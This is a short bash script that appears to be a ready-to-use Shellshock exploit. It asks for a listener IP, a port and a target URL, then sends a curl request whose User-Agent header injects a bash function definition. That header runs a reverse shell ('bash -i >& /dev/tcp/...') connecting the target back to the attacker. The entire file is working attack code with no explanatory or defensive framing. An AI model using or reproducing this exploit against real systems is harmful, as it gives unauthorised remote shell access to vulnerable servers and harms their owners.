#!/bin/bash

read -p "LHOST IP: " lhost
read -p "LHOST PORT: " lport
echo "Start Listner on port $lport"
read -p "URL: " url
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'" $url&
